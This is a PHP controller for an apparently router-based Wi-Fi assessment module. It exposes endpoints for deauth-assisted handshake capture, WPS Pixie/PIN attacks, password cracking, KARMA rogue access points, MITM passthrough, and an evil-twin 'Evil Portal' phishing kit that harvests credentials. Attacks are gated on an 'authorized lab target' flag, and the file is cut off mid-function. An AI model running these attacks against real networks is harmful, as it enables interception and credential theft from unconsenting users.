<?php
namespace frieren\modules\wireless_assessment;

class Wireless_assessmentController extends \frieren\core\Controller
{
    protected $endpointRoutes = [
        'moduleStatus' => true,
        'scanNetworks' => true,
        'scanStatus' => true,
        'getReconDatabase' => true,
        'updateTargetMetadata' => true,
        'startCapture' => true,
        'captureStatus' => true,
        'stopCapture' => true,
        'getCaptureHistory' => true,
        'downloadCapture' => true,
        'deleteCapture' => true,
        'wpsScan' => true,
        'wpsScanStatus' => true,
        'startWpsAttack' => true,
        'wpsAttackStatus' => true,
        'stopWpsAttack' => true,
        'getWpsHistory' => true,
        'deleteWpsResult' => true,
        'startBeaconHarvest' => true,
        'beaconHarvestStatus' => true,
        'stopBeaconHarvest' => true,
        'startEvilPortal' => true,
        'evilPortalStatus' => true,
        'evilPortalTraffic' => true,
        'stopEvilPortal' => true,
        'getRadioMode' => true,
        'setRadioMode' => true,
        'startLanScan' => true,
        'lanScanStatus' => true,
        'stopLanScan' => true,
        'getNetworkInventory' => true,
        'updateNetworkInventory' => true,
        'clearNetworkInventory' => true,
        'startSniff' => true,
        'sniffStatus' => true,
        'stopSniff' => true,
        'downloadSniff' => true,
        'deleteSniff' => true,
        'listCrackSources' => true,
        'listWordlists' => true,
        'generateWordlist' => true,
        'uploadWordlist' => true,
        'deleteWordlist' => true,
        'uploadCapture' => true,
        'deleteCrackSource' => true,
        'startCrack' => true,
        'crackStatus' => true,
        'stopCrack' => true,
        'updateMitm' => true,
        'mitmStatus' => true,
        'stopMitm' => true,
        'computeWpsPins' => true,
        'startClientless' => true,
        'clientlessStatus' => true,
        'stopClientless' => true,
        'listPortalTemplates' => true,
        'getPortalCreds' => true,
        'clearPortalCreds' => true,
        'startKarma' => true,
        'karmaStatus' => true,
        'stopKarma' => true,
    ];

    private $coreTools = ['iw', 'iwinfo', 'wifi', 'ubus', 'uci', 'airodump-ng', 'aireplay-ng', 'hcxpcapngtool', 'nmap', 'curl'];
    private $optionalTools = ['tcpdump', 'aircrack-ng', 'hcxdumptool', 'hcxhashtool', 'reaver', 'wash', 'bully', 'airbase-ng', 'sqlite3', 'hostapd', 'dnsmasq', 'nft', 'uhttpd'];

    public function moduleStatus()
    {
        return self::setSuccess([
            'system' => $this->getSystemInfo(),
            'storage' => $this->getStorageInfo(),
            'tools' => $this->getToolStatus(),
            'packages' => $this->getPackageStatus(),
            'radios' => $this->getRadios(),
            'interfaces' => $this->getWirelessInterfaces(),
            'uciWireless' => $this->redactWirelessConfig(),
        ]);
    }

    public function scanNetworks()
    {
        $band = $this->request['band'] ?? '2g';
        if ($band === 'both') {
            // Two separate radios (2.4GHz phy1 + 5GHz phy0) scan in parallel.
            $jobs = [];
            foreach (['2g', '5g'] as $b) {
                $job = $this->createScanJob($b);
                if (isset($job['error'])) {
                    return self::setError($job['error']);
                }
                $jobs[] = $job;
            }
            return self::setSuccess(['pending' => true, 'jobs' => $jobs]);
        }

        $b = ($band === '5g') ? '5g' : '2g';
        $job = $this->createScanJob($b);
        if (isset($job['error'])) {
            return self::setError($job['error']);
        }
        return self::setSuccess([
            'pending' => true,
            'jobId' => $job['jobId'],
            'interface' => $job['interface'],
            'band' => $job['band'],
            'jobs' => [$job],
        ]);
    }

    public function scanStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid scan job.');
        }

        $paths = $this->scanJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Scan job was not found.');
        }

        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $interface = isset($meta['interface']) && is_string($meta['interface']) ? $meta['interface'] : '';
        $band = isset($meta['band']) && is_string($meta['band']) ? $meta['band'] : '';
        if (!is_file($paths['done'])) {
            return self::setSuccess([
                'pending' => true,
                'jobId' => $jobId,
                'interface' => $interface,
                'band' => $band,
            ]);
        }

        $output = (string)@file_get_contents($paths['out']);
        $errorOutput = trim((string)@file_get_contents($paths['err']));
        $this->cleanupScanJob($paths);

        if (trim($output) === '') {
            return self::setSuccess([
                'pending' => false,
                'interface' => $interface,
                'band' => $band,
                'networks' => [],
                'message' => $errorOutput !== '' ? $errorOutput : 'No scan results returned. The interface may be busy, down, or not allowed to scan in its current mode.',
            ]);
        }

        $networks = $this->parseIwinfoScan($output);
        // The job ran two scan passes back-to-back (see createScanJob) to counter
        // single-pass under-reporting, so the same BSSID can appear twice here.
        // Keep one row per BSSID, preferring whichever pass had the stronger signal.
        $byBssid = [];
        foreach ($networks as $net) {
            $b = strtolower((string)($net['bssid'] ?? ''));
            if ($b === '') {
                continue;
            }
            if (!isset($byBssid[$b]) || $this->signalDbm($net) > $this->signalDbm($byBssid[$b])) {
                $byBssid[$b] = $net;
            }
        }
        $networks = array_values($byBssid);
        // Tag each row with the band it was found on (belt-and-suspenders; the
        // channel already implies the band, but a merged view uses this directly).
        foreach ($networks as &$net) {
            if (!isset($net['band']) || $net['band'] === '') {
                $ch = (int)($net['channel'] ?? 0);
                $net['band'] = ($ch > 14) ? '5g' : ($ch > 0 ? '2g' : $band);
            }
        }
        unset($net);
        $networks = $this->attachVendors($networks, 'bssid');

        return self::setSuccess([
            'pending' => false,
            'interface' => $interface,
            'band' => $band,
            'networks' => $networks,
        ]);
    }

    public function getReconDatabase()
    {
        return self::setSuccess($this->readReconDatabase());
    }

    public function updateTargetMetadata()
    {
        $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
        if (!$this->isSafeBssid($bssid)) {
            return self::setError('Invalid target BSSID.');
        }

        if (!$this->ensureStorage()) {
            return self::setError('Unable to write target metadata.');
        }

        $db = $this->readReconDatabase();
        if (!isset($db['targets'][$bssid]) || !is_array($db['targets'][$bssid])) {
            return self::setError('Target has not been saved yet.');
        }

        $metadata = $this->normalizeTargetMetadata($this->request['metadata'] ?? []);
        $timestamp = gmdate('c');
        $db['updatedAt'] = $timestamp;
        $db['targets'][$bssid]['metadata'] = $metadata;
        $db['targets'][$bssid]['metadataUpdatedAt'] = $timestamp;

        if (!$this->writeReconDatabase($db)) {
            return self::setError('Unable to save target metadata.');
        }

        return self::setSuccess([
            'target' => $db['targets'][$bssid],
            'database' => $db,
        ]);
    }

    public function startCapture()
    {
        $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
        $client = strtolower(trim((string)($this->request['client'] ?? '')));
        $duration = (int)($this->request['duration'] ?? 45);
        $deauth = !isset($this->request['deauth']) || !empty($this->request['deauth']);

        // Operator-tunable deauth cadence. Defaults reproduce the old behaviour
        // (burst of 4 every 6s, no settle) but can be softened to "burst then
        // listen" so a flood doesn't sabotage the handshake / PMKID.
        $deauthRounds = (int)($this->request['deauthRounds'] ?? 4);
        $deauthInterval = (int)($this->request['deauthInterval'] ?? 6);
        $deauthDelay = (int)($this->request['deauthDelay'] ?? 0);

        if (!$this->isSafeBssid($bssid)) {
            return self::setError('Invalid target BSSID.');
        }
        if ($client !== '' && !$this->isSafeBssid($client)) {
            return self::setError('Invalid client MAC.');
        }
        if ($duration < 15 || $duration > 120) {
            return self::setError('Capture duration must be between 15 and 120 seconds.');
        }
        if ($deauthRounds < 1 || $deauthRounds > 64) {
            return self::setError('Deauth burst size must be between 1 and 64 rounds.');
        }
        if ($deauthInterval < 3 || $deauthInterval > 60) {
            return self::setError('Deauth interval must be between 3 and 60 seconds.');
        }
        if ($deauthDelay < 0 || $deauthDelay > 60) {
            return self::setError('Initial listen delay must be between 0 and 60 seconds.');
        }
        if ($deauthDelay >= $duration) {
            return self::setError('Initial listen delay must be shorter than the capture duration.');
        }

        foreach (['airodump-ng', 'aireplay-ng', 'hcxpcapngtool'] as $tool) {
            if (trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null')) === '') {
                return self::setError("Required tool '{$tool}' is not installed.");
            }
        }

        if ($this->isCaptureRunning()) {
            return self::setError('A capture is already running. Stop it before starting another.');
        }

        // Ephemeral model: the target comes straight from the live scan the operator
        // is looking at, along with an explicit authorization assertion. Nothing is
        // read from disk.
        if (empty($this->request['authorized'])) {
            return self::setError('Target must be marked as an authorized lab target before capture.');
        }
        $target = [
            'bssid' => $bssid,
            'ssid' => $this->cleanSsid((string)($this->request['ssid'] ?? '')),
            'security' => trim((string)($this->request['security'] ?? '')),
            'frequency' => '',
            'metadata' => ['label' => $this->cleanSsid((string)($this->request['ssid'] ?? '')), 'authorized' => true],
        ];

        $channel = (int)($this->request['channel'] ?? 0);
        if ($channel < 1 || $channel > 196) {
            return self::setError('Target channel is unknown. Re-scan the target before capturing.');
        }

        // APs with auto/DFS channel selection drift, so the reported channel can be
        // stale. Refresh it with a quick live scan before locking the monitor to it,
        // otherwise the monitor sits on the wrong channel and captures nothing.
        $liveChannel = $this->refreshTargetChannel($bssid, $channel <= 14 ? '2g' : '5g');
        if ($liveChannel !== null) {
            $channel = $liveChannel;
        }
        $target['channel'] = (string)$channel;

        $monitor = $this->resolveMonitorTarget($channel);
        if ($monitor === null) {
            return self::setError('Could not find a radio that supports the target channel.');
        }

        return $this->startCaptureJob($target, $channel, $monitor, $client, $duration, $deauth, $deauthRounds, $deauthInterval, $deauthDelay);
    }

    public function captureStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }

        $paths = $this->captureJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Capture job was not found.');
        }

        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $this->reconcileCaptureJob($paths, $meta);
        $pending = !is_file($paths['done']);
        $result = $this->summarizeCaptureResult($paths);
        $out = $this->tailFile($paths['out'], 6000);
        $errText = trim($this->tailFile($paths['err'], 4000));
        $deauth = !empty($meta['deauth']);

        return self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'log' => $out,
            'error' => $errText,
            'exitCode' => is_file($paths['done']) ? trim((string)@file_get_contents($paths['done'])) : '',
            'result' => $result,
            'steps' => $this->deriveCaptureSteps($out, $errText, $pending, $deauth, $result),
            'stopReason' => $pending ? null : $this->captureStopReason($out, $errText, $result),
        ]);
    }

    public function stopCapture()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }

        $paths = $this->captureJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Capture job was not found.');
        }

        // The running job polls for this flag and self-terminates cleanly,
        // guaranteeing the monitor interface is torn down and the radio restored.
        @file_put_contents($paths['stop'], gmdate('c'));

        return self::setSuccess([
            'stopping' => true,
            'jobId' => $jobId,
        ]);
    }

    public function getCaptureHistory()
    {
        $dir = $this->captureJobDir();
        $history = [];
        if (is_dir($dir)) {
            foreach (glob($dir . '/*.json') as $metaPath) {
                $jobId = basename($metaPath, '.json');
                if (!$this->isSafeJobId($jobId)) {
                    continue;
                }
                $paths = $this->captureJobPaths($jobId);
                $meta = json_decode((string)@file_get_contents($paths['meta']), true);
                $meta = is_array($meta) ? $meta : [];
                $this->reconcileCaptureJob($paths, $meta);
                $history[] = [
                    'jobId' => $jobId,
                    'meta' => $meta,
                    'pending' => !is_file($paths['done']),
                    'exitCode' => is_file($paths['done']) ? trim((string)@file_get_contents($paths['done'])) : '',
                    'result' => $this->summarizeCaptureResult($paths),
                ];
            }
        }
        usort($history, function ($a, $b) {
            return strcmp($b['jobId'], $a['jobId']);
        });

        return self::setSuccess(['captures' => $history]);
    }

    public function downloadCapture()
    {
        $jobId = $this->request['jobId'] ?? '';
        $kind = $this->request['kind'] ?? 'hash';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }

        $paths = $this->captureJobPaths($jobId);
        $file = $kind === 'pcap' ? $paths['cap'] : $paths['hash'];
        if (!is_file($file) || filesize($file) === 0) {
            return self::setError('Requested capture file is not available.');
        }

        $this->responseHandler->streamFile($file);
    }

    public function deleteCapture()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid capture job.');
        }

        $paths = $this->captureJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Capture job was not found.');
        }
        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $this->reconcileCaptureJob($paths, is_array($meta) ? $meta : []);
        if (!is_file($paths['done'])) {
            return self::setError('Cannot delete a capture that is still running.');
        }

        foreach ($paths as $path) {
            if (is_string($path) && is_file($path)) {
                @unlink($path);
            }
        }
        @unlink($paths['cap']);

        return self::setSuccess(['deleted' => true, 'jobId' => $jobId]);
    }

    public function wpsScan()
    {
        $bandReq = $this->request['band'] ?? '2g';
        $band = in_array($bandReq, ['2g', '5g', 'both'], true) ? $bandReq : '2g';
        $duration = (int)($this->request['duration'] ?? 25);
        if ($duration < 10 || $duration > 90) {
            return self::setError('Scan duration must be between 10 and 90 seconds.');
        }
        if (trim((string)shell_exec('command -v airodump-ng 2>/dev/null')) === '') {
            return self::setError("Required tool 'airodump-ng' is not installed.");
        }
        if ($this->isWpsBusy() || $this->isCaptureRunning()) {
            return self::setError('Another RF job is already running. Stop it first.');
        }

        // Resolve one monitor pass per requested band. Both radios are separate
        // PHYs, so 2.4GHz + 5GHz passes run concurrently within a single job.
        $bands = ($band === 'both') ? ['2g', '5g'] : [$band];
        $passes = [];
        foreach ($bands as $i => $b) {
            $monitor = $this->resolveMonitorTarget($b === '2g' ? 1 : 149);
            if ($monitor === null) {
                return self::setError('Could not find a radio for the ' . ($b === '5g' ? '5 GHz' : '2.4 GHz') . ' band.');
            }
            $passes[] = [
                'band' => $b,
                'monitor' => $monitor,
                'airBand' => ($b === '5g') ? 'a' : 'bg',
                'mon' => ($b === '5g') ? 'wpsmon5' : 'wpsmon2',
                'capSuffix' => ($i === 0) ? '' : '-b',
            ];
        }

        return $this->startWpsScanJob($band, $passes, $duration);
    }

    public function wpsScanStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid WPS job.');
        }

        $paths = $this->wpsJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('WPS scan job was not found.');
        }

        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);

        // A both-band scan writes one cap per band ($jobId-01.cap + $jobId-b-01.cap);
        // parse every cap for the job and merge discovered APs by BSSID.
        $caps = glob($this->wpsJobDir() . '/' . $jobId . '*.cap') ?: [];
        $capBytes = 0;
        $byBssid = [];
        foreach ($caps as $cap) {
            $capBytes += (int)@filesize($cap);
            foreach ($this->parseWpsCapture($cap) as $net) {
                $key = strtolower($net['bssid'] ?? '');
                if ($key === '') {
                    continue;
                }
                if (!isset($byBssid[$key])) {
                    $byBssid[$key] = $net;
                }
            }
        }
        // airodump's cap has no radiotap, so RSSI lives in the sibling CSV. Pull the
        // strongest Power per BSSID from every CSV and stamp it onto matching APs.
        $signalByBssid = [];
        foreach (glob($this->wpsJobDir() . '/' . $jobId . '*.csv') ?: [] as $csvFile) {
            $parsed = $this->parseAirodumpCsv(@file_get_contents($csvFile));
            foreach ($parsed['aps'] as $ap) {
                $key = strtolower($ap['bssid'] ?? '');
                if ($key === '' || $ap['signal'] === '') {
                    continue;
                }
                $val = (int)$ap['signal'];
                if (!isset($signalByBssid[$key]) || $val > (int)$signalByBssid[$key]) {
                    $signalByBssid[$key] = $ap['signal'];
                }
            }
        }
        foreach ($byBssid as $key => &$net) {
            if (empty($net['signal']) && isset($signalByBssid[$key])) {
                $net['signal'] = $signalByBssid[$key];
            }
        }
        unset($net);

        $networks = $this->attachVendors(array_values($byBssid), 'bssid');
        if (!$pending && !empty($networks)) {
            $this->mergeWpsResults($networks);
        }

        $response = self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'networks' => $networks,
            'capBytes' => $capBytes,
            'log' => $this->tailFile($paths['out'], 4000),
            'error' => trim($this->tailFile($paths['err'], 3000)),
        ]);

        // Discovery is ephemeral: once a scan finishes and its results are read,
        // drop the caps + job files (the frontend stops polling on !pending). This
        // also cleans up the per-band caps a both-band scan produces.
        if (!$pending && strpos($jobId, 'scan-') === 0) {
            foreach (glob($this->wpsJobDir() . '/' . $jobId . '*') ?: [] as $side) {
                if (is_file($side)) {
                    @unlink($side);
                }
            }
            foreach ($paths as $path) {
                if (is_string($path) && is_file($path)) {
                    @unlink($path);
                }
            }
        }

        return $response;
    }

    public function startWpsAttack()
    {
        $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
        $mode = (($this->request['mode'] ?? 'pixie') === 'pin') ? 'pin' : 'pixie';
        $pin = preg_replace('/\D/', '', (string)($this->request['pin'] ?? ''));
        $timeout = (int)($this->request['timeout'] ?? 120);

        if (!$this->isSafeBssid($bssid)) {
            return self::setError('Invalid target BSSID.');
        }
        if ($timeout < 30 || $timeout > 600) {
            return self::setError('Timeout must be between 30 and 600 seconds.');
        }
        if ($pin !== '' && (strlen($pin) < 4 || strlen($pin) > 8)) {
            return self::setError('A WPS PIN must be 4 to 8 digits.');
        }
        foreach (['wash', 'reaver'] as $tool) {
            if (trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null')) === '') {
                return self::setError("Required tool '{$tool}' is not installed.");
            }
        }
        if ($this->isWpsBusy() || $this->isCaptureRunning()) {
            return self::setError('Another RF job is already running. Stop it first.');
        }

        if (empty($this->request['authorized'])) {
            return self::setError('Target must be marked as an authorized lab target before a WPS attack.');
        }
        $target = [
            'bssid' => $bssid,
            'ssid' => $this->cleanSsid((string)($this->request['ssid'] ?? '')),
            'metadata' => ['label' => $this->cleanSsid((string)($this->request['ssid'] ?? '')), 'authorized' => true],
        ];

        $channel = (int)($this->request['channel'] ?? 0);
        if ($channel < 1 || $channel > 196) {
            return self::setError('Target channel is unknown. Run a WPS scan or recon scan first.');
        }
        $target['channel'] = (string)$channel;

        $monitor = $this->resolveMonitorTarget($channel);
        if ($monitor === null) {
            return self::setError('Could not find a radio that supports the target channel.');
        }

        return $this->startWpsAttackJob($target, $channel, $monitor, $mode, $pin, $timeout);
    }

    public function wpsAttackStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid WPS job.');
        }

        $paths = $this->wpsJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('WPS attack job was not found.');
        }

        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);
        $out = $this->tailFile($paths['out'], 8000);
        $errText = trim($this->tailFile($paths['err'], 3000));
        $result = $this->parseWpsAttackResult($out . "\n" . $errText);
        $mode = $meta['mode'] ?? 'pixie';

        // Live countdown: elapsed from when the job dir was created, versus the
        // hard timeout, so the UI can show "Xs of Ys" and reassure the operator
        // that the run WILL stop on its own.
        $timeoutSec = (int)($meta['timeout'] ?? 0);
        $startedAt = is_file($paths['meta']) ? (int)filemtime($paths['meta']) : time();
        $elapsedSec = max(0, time() - $startedAt);
        $timedOut = (bool)preg_match('/hard timeout reached/i', $out);

        return self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'result' => $result,
            'steps' => $this->deriveWpsSteps($out, $errText, $pending, $mode, $result),
            'stopReason' => $pending ? null : $this->wpsStopReason($out, $errText, $result),
            'log' => $out,
            'error' => $errText,
            'timeoutSec' => $timeoutSec,
            'elapsedSec' => $elapsedSec,
            'timedOut' => $timedOut,
            'exitCode' => is_file($paths['done']) ? trim((string)@file_get_contents($paths['done'])) : '',
        ]);
    }

    public function stopWpsAttack()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid WPS job.');
        }
        $paths = $this->wpsJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('WPS job was not found.');
        }
        @file_put_contents($paths['stop'], gmdate('c'));
        return self::setSuccess(['stopping' => true, 'jobId' => $jobId]);
    }

    public function getWpsHistory()
    {
        $dir = $this->wpsJobDir();
        $history = [];
        if (is_dir($dir)) {
            foreach (glob($dir . '/*.json') as $metaPath) {
                $jobId = basename($metaPath, '.json');
                if (!$this->isSafeJobId($jobId)) {
                    continue;
                }
                $meta = json_decode((string)@file_get_contents($metaPath), true);
                $meta = is_array($meta) ? $meta : [];
                if (($meta['type'] ?? '') !== 'attack') {
                    continue;
                }
                $paths = $this->wpsJobPaths($jobId);
                $history[] = [
                    'jobId' => $jobId,
                    'meta' => $meta,
                    'pending' => !is_file($paths['done']),
                    'result' => $this->parseWpsAttackResult($this->tailFile($paths['out'], 8000)),
                ];
            }
        }
        usort($history, function ($a, $b) {
            return strcmp($b['jobId'], $a['jobId']);
        });
        return self::setSuccess(['attacks' => $history]);
    }

    public function deleteWpsResult()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid WPS job.');
        }
        $paths = $this->wpsJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('WPS job was not found.');
        }
        if (!is_file($paths['done'])) {
            return self::setError('Cannot delete a WPS job that is still running.');
        }
        foreach ($paths as $path) {
            if (is_string($path) && is_file($path)) {
                @unlink($path);
            }
        }
        return self::setSuccess(['deleted' => true, 'jobId' => $jobId]);
    }

    public function startBeaconHarvest()
    {
        $bandReq = $this->request['band'] ?? '2g';
        $band = in_array($bandReq, ['2g', '5g', 'both'], true) ? $bandReq : '2g';
        $duration = (int)($this->request['duration'] ?? 45);
        if ($duration < 15 || $duration > 180) {
            return self::setError('Harvest duration must be between 15 and 180 seconds.');
        }
        if (trim((string)shell_exec('command -v airodump-ng 2>/dev/null')) === '') {
            return self::setError("Required tool 'airodump-ng' is not installed.");
        }
        if ($this->isCaptureRunning() || $this->isWpsBusy()) {
            return self::setError('Another RF job is already running. Stop it first.');
        }

        // One monitor pass per band; 2.4GHz + 5GHz run concurrently on separate PHYs.
        $bands = ($band === 'both') ? ['2g', '5g'] : [$band];
        $passes = [];
        foreach ($bands as $i => $b) {
            $monitor = $this->resolveMonitorTarget($b === '2g' ? 1 : 149);
            if ($monitor === null) {
                return self::setError('Could not find a radio for the ' . ($b === '5g' ? '5 GHz' : '2.4 GHz') . ' band.');
            }
            $passes[] = [
                'band' => $b,
                'monitor' => $monitor,
                'airBand' => ($b === '5g') ? 'a' : 'bg',
                'mon' => ($b === '5g') ? 'bhmon5' : 'bhmon2',
                'capSuffix' => ($i === 0) ? '' : '-b',
            ];
        }

        return $this->startBeaconHarvestJob($band, $passes, $duration);
    }

    public function beaconHarvestStatus()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid harvest job.');
        }

        $paths = $this->beaconJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Harvest job was not found.');
        }

        $meta = json_decode((string)@file_get_contents($paths['meta']), true);
        $meta = is_array($meta) ? $meta : [];
        $pending = !is_file($paths['done']);

        // A both-band harvest produces one csv+cap per band; parse and merge all.
        $parsed = ['aps' => [], 'clients' => []];
        $apByBssid = [];
        $clientByMac = [];
        foreach (glob($this->beaconJobDir() . '/' . $jobId . '*.csv') ?: [] as $csvFile) {
            $one = $this->parseAirodumpCsv((string)@file_get_contents($csvFile));
            foreach ($one['aps'] as $ap) {
                $key = strtolower($ap['bssid'] ?? '');
                if ($key !== '' && !isset($apByBssid[$key])) {
                    $apByBssid[$key] = $ap;
                }
            }
            foreach ($one['clients'] as $cl) {
                $key = strtolower($cl['mac'] ?? ($cl['station'] ?? json_encode($cl)));
                if (!isset($clientByMac[$key])) {
                    $clientByMac[$key] = $cl;
                }
            }
        }
        $parsed['aps'] = $this->attachVendors(array_values($apByBssid), 'bssid');
        $parsed['clients'] = $this->attachVendors(array_values($clientByMac), 'mac');

        $wps = [];
        foreach (glob($this->beaconJobDir() . '/' . $jobId . '*.cap') ?: [] as $capFile) {
            foreach ($this->parseWpsCapture($capFile) as $w) {
                $wps[$w['bssid']] = $w;
            }
        }
        foreach ($parsed['aps'] as &$ap) {
            if (isset($wps[$ap['bssid']])) {
                $ap['wps'] = ['enabled' => true, 'version' => $wps[$ap['bssid']]['wpsVersion'], 'locked' => (bool)$wps[$ap['bssid']]['wpsLocked']];
            }
        }
        unset($ap);

        if (!$pending && (!empty($parsed['aps']) || !empty($parsed['clients']))) {
            $this->mergeBeaconResults($parsed['aps'], $parsed['clients']);
        }

        $response = self::setSuccess([
            'pending' => $pending,
            'jobId' => $jobId,
            'meta' => $meta,
            'aps' => $parsed['aps'],
            'clients' => $parsed['clients'],
            'apCount' => count($parsed['aps']),
            'clientCount' => count($parsed['clients']),
            'error' => trim($this->tailFile($paths['err'], 3000)),
        ]);

        // Harvest results are ephemeral: once read, drop the caps/csvs + job files
        // (frontend stops polling on !pending). Also clears the per-band files a
        // both-band harvest produces.
        if (!$pending) {
            foreach (glob($this->beaconJobDir() . '/' . $jobId . '*') ?: [] as $f) {
                @unlink($f);
            }
        }

        return $response;
    }

    public function stopBeaconHarvest()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid harvest job.');
        }
        $paths = $this->beaconJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Harvest job was not found.');
        }
        @file_put_contents($paths['stop'], gmdate('c'));
        return self::setSuccess(['stopping' => true, 'jobId' => $jobId]);
    }

    public function startEvilPortal()
    {
        $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
        $band = (($this->request['band'] ?? '2g') === '5g') ? '5g' : '2g';
        $channel = (int)($this->request['channel'] ?? ($band === '5g' ? 36 : 6));
        // Internet passthrough (MITM) mode: clients get real internet through the
        // uplink while we log their DNS + capture traffic. No captive portal.
        $internet = !empty($this->request['internet']);

        // Portal Kit: which login template the captive page serves. Defaults to the
        // classic Wi-Fi-password page so existing Evil Portal callers are unchanged.
        $template = (string)($this->request['template'] ?? 'wifi');
        $customHtml = (string)($this->request['customHtml'] ?? '');
        if (!isset($this->portalTemplateDefs()[$template])) {
            return self::setError('Unknown portal template.');
        }
        if ($template === 'custom') {
            if (trim($customHtml) === '') {
                return self::setError('Custom template needs HTML with a <form method=post action=/cgi-bin/submit>.');
            }
            if (strlen($customHtml) > 40000) {
                return self::setError('Custom HTML is too large (max 40 KB).');
            }
        }

        if (!$this->isSafeBssid($bssid)) {
            return self::setError('Invalid target BSSID.');
        }
        if ($internet && $band === '5g') {
            return self::setError('Internet passthrough needs the 5GHz radio for the uplink, so the twin must be 2.4GHz. Choose the 2.4GHz band.');
        }
        if ($band === '2g') {
            if ($channel < 1 || $channel > 13) {
                return self::setError('Twin AP channel must be a 2.4GHz channel (1-13).');
            }
        } else {
            // Non-DFS 5GHz channels only. DFS channels (52-144) require radar CAC,
            // which stalls or aborts hostapd, so they are unusable for a twin AP.
            $allowed5g = [36, 40, 44, 48, 149, 153, 157, 161, 165];
            if (!in_array($channel, $allowed5g, true)) {
                return self::setError('5GHz twin channel must be non-DFS: ' . implode(', ', $allowed5g) . '.');
            }
        }
        foreach (['hostapd', 'dnsmasq', 'nft', 'uhttpd'] as $tool) {
            if (trim((string)shell_exec('command -v ' . escapeshellarg($tool) . ' 2>/dev/null')) === '') {
                return self::setError("Required tool '{$tool}' is not installed.");
            }
        }
        if ($this->isEvilPortalRunning()) {
            return self::setError('Evil Portal is already running. Stop it first.');
        }
        if ($this->isKarmaRunning()) {
            return self::setError('The Rogue AP (KARMA) is running on the same radio. Stop it first.');
        }

        if (empty($this->request['authorized'])) {
            return self::setError('Target must be marked as an authorized lab target before running the Evil Portal.');
        }
        $ssid = $this->cleanSsid((string)($this->request['ssid'] ?? ''));
        if ($ssid === '' || $ssid === '<hidden>') {
            return self::setError('Target SSID is unknown. Scan the target first so the twin can clone its name.');
        }

        // The twin AP needs a free radio for the chosen band; it must not be the uplink.
        $bandLabel = ($band === '5g') ? '5GHz' : '2.4GHz';
        $monitor = $this->resolveMonitorTarget($channel);
        if ($monitor === null) {
            return self::setError("Could not find a {$bandLabel} radio for the twin AP.");
        }
        if (!empty($monitor['manageRadio'])) {
            return self::setError("The {$bandLabel} radio is currently in use (uplink or AP). Switch to Lab mode to free it before running the twin.");
        }

        // For passthrough we need a live internet uplink to NAT clients out through.
        $uplinkDev = '';
        if ($internet) {
            $route = (string)shell_exec("ip -o route get 1.1.1.1 2>/dev/null");
            if (!preg_match('/dev\s+(\S+)/', $route, $dm)) {
                return self::setError('Internet passthrough needs a working uplink. Switch to Internet (uplink) mode first, then run the twin on 2.4GHz.');
            }
            $uplinkDev = $dm[1];
        }

        $verifyCap = $this->findHandshakeCap($bssid);

        return $this->launchEvilPortal($bssid, $ssid, $channel, $monitor, $verifyCap, $band, $internet, $uplinkDev, $template, $customHtml);
    }

    public function evilPortalStatus()
    {
        $state = $this->readEvilPortalState();
        if (empty($state['running'])) {
            return self::setSuccess(['running' => false, 'state' => $state]);
        }

        $alive = $this->isEvilPortalRunning();
        $clients = $this->readEvilPortalLeases();
        $credentials = $this->readEvilPortalCreds();

        return self::setSuccess([
            'running' => $alive,
            'state' => $state,
            'clients' => $clients,
            'clientCount' => count($clients),
            'credentials' => $credentials,
            'verifiedPassword' => $this->firstVerifiedPassword($credentials),
        ]);
    }

    public function stopEvilPortal()
    {
        $this->teardownEvilPortal();
        return self::setSuccess(['running' => false, 'stopped' => true]);
    }

    // ---- Suite: Captive Portal Phishing Kit ------------------------------------
    // Thin surface over the Evil Portal runtime: template catalog + credential
    // read/clear. The portal itself is launched via startEvilPortal({template,...}).

    public function listPortalTemplates()
    {
